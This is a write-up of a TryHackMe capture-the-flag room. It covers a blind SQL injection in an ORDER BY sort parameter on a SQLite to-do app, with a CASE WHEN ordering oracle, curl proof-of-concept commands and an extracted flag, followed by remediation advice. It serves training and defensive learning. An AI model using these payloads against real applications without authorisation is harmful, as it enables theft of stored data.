# Prioritise — SQL Injection (ORDER BY) Report

- **Target:** http://10.64.172.157/  (TryHackMe "Prioritise")
- **Classification:** OWASP Top 10 2021 — **A03:2021 Injection** (SQL Injection)
- **Test guide:** OWASP WSTG **WSTG-INPV-05** (SQL Injection)
- **MITRE ATT&CK (secondary):** T1190 – Exploit Public-Facing Application
- **Severity:** High (blind SQLi → full DB read, including secret `flag` table)
- **Status:** Exploited / Proof-of-concept completed

---

## 1. Summary

The to-do list application sorts tasks via a user-controlled `order` GET parameter that is
concatenated directly into an `ORDER BY` clause. The parameter is not validated or allow-listed,
allowing SQL injection. Because the backend is **SQLite** and errors are not echoed (generic 500),
the injection is **blind**; data was extracted with a boolean oracle based on result ordering.

The database contained a secret table (name rotates on reset between `xlag` / `flag`) holding the
flag. Extracted value:

```
flag{65f2f8cfd53d59422f3d7cc62cc8fdcd}
```

## 2. Affected endpoint

```
GET /?order=<payload>
```

The `order` value is placed into `ORDER BY <value>`. Observed values: `title`, `done`, `date`.

## 3. Vulnerability detail

- **Type:** SQL Injection in `ORDER BY` (a "less common" injection point — `ORDER BY` cannot use
  `UNION SELECT`, so classic union-based extraction fails; blind/error/boolean techniques are required).
- **DBMS:** SQLite 3.35.5 (no `IF()`, no `SLEEP()`; supports `CASE WHEN`, subqueries, `pragma_table_info`).
- **Blind:** Server returns a generic `500 Internal Server Error` page; no DBMS error text leaks.
- **Confirmed:** `?order=title'` → HTTP 500 (syntax error). `?order=(SELECT sqlite_version())` → 200.

## 4. Exploitation technique (boolean oracle via ordering)

Two sentinel rows were inserted so the sort order reveals a boolean:

| Row  | title | date       | role               |
|------|-------|------------|--------------------|
| S1   | AAAA  | 2999-12-31 | title-first        |
| S2   | ZZZZ  | 1900-01-01 | date-first         |

Injection:
```
?order=CASE WHEN (<cond>) THEN title ELSE date END
```
- `cond` TRUE  → sorted by `title`  → first row = **AAAA**
- `cond` FALSE → sorted by `date`   → first row = **ZZZZ**

The first visible row's title was parsed from the response; `AAAA` = true, `ZZZZ` = false.
Each character of a target SQL expression was recovered with binary search on
`unicode(substr(<expr>,i,1))`.

### Schema enumerated (blind)
- `todos`: `id INTEGER NOT NULL, title VARCHAR(40), done BOOLEAN, date`
- secret table (rotating name): 1 column `flag`, 1 row.

### Data extracted
```
(SELECT flag FROM flag)  =>  flag{65f2f8cfd53d59422f3d7cc62cc8fdcd}
```

## 5. Proof of concept (reproducible)

```bash
# 1) confirm injection (syntax error -> 500)
curl -s -o /dev/null -w "%{http_code}\n" "http://10.64.172.157/?order=title'"

# 2) insert sentinel rows for the ordering oracle
curl -s -o /dev/null -X POST "http://10.64.172.157/new" --data "title=AAAA&date=12/31/2999"
curl -s -o /dev/null -X POST "http://10.64.172.157/new" --data "title=ZZZZ&date=01/01/1900"

# 3) blind extraction
python3 scripts/orderby_blind_fast.py "(SELECT flag FROM flag)"
```

## 6. Impact

- Confidentiality: full read of the application database, including a secret `flag` value.
- In SQLite `ORDER BY` context, write/exec is limited, but all stored data is exposed.
- The same pattern (unvalidated sort/filter parameter) commonly allows broader injection if the
  value is reused elsewhere (WHERE/INSERT).

## 7. Root cause

Untrusted input (`order`) is concatenated into a SQL statement without parameterization or an
allow-list of valid column names.

## 8. Remediation

- **Allow-list** the sort column: only accept `title`, `done`, `date` (and a fixed direction).
- Never build SQL by string concatenation of user input; if dynamic sorting is required, map a
  user token to a hardcoded column name server-side.
- Return generic errors but log details server-side; disable verbose error output.
- Least-privilege DB account; do not store secrets in the same schema as app data.

## 9. Evidence

- `loot/flag.txt` — extracted flag.
- `loot/extracted.txt` — raw extraction log.
- `evidence/schema.txt` — enumerated schema.
- `scripts/orderby_blind_fast.py` — ordering-based blind extractor.
- `web/order_title.html` — captured sort response.

## 10. Mapping

| Framework | ID | Note |
|-----------|----|------|
| OWASP Top 10 2021 | A03:2021 | Injection |
| OWASP WSTG | WSTG-INPV-05 | SQL Injection |
| MITRE ATT&CK | T1190 | Exploit Public-Facing Application (initial access, high-level) |
